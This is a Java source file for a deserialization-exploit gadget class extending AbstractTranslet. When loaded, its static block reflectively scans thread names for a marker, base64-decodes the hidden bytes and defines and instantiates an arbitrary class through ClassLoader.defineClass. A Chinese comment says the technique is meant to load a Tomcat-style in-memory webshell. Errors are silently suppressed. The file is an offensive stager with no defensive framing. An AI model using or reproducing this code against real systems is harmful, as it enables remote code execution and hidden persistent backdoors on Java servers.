import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;

public class LClassLoader extends AbstractTranslet {
    static {
        try{
            ThreadGroup v1 = Thread.currentThread().getThreadGroup();
            Field v2 = v1.getClass().getDeclaredField("threads");
            v2.setAccessible(true);
            Thread[] v3 = (Thread[]) v2.get(v1);
            for(int i = 0; i < v3.length; ++i) {
                Thread z = v3[i];
                if (z.getName().contains("r1")) {
                    byte[] x = Base64.getDecoder().decode(z.getName().replaceAll("r1cky", ""));
                    Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    defineClassMethod.setAccessible(true);
                    // 触发了但是没法导入获取上下文的实例, 可以导入tomcat类似的内存马
                    Class c = (Class)defineClassMethod.invoke(LClassLoader.class.getClassLoader(), x, 0, x.length);
                    c.newInstance();
                }
            }
        }catch (Exception e){
        }
    }

    public LClassLoader(){}

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
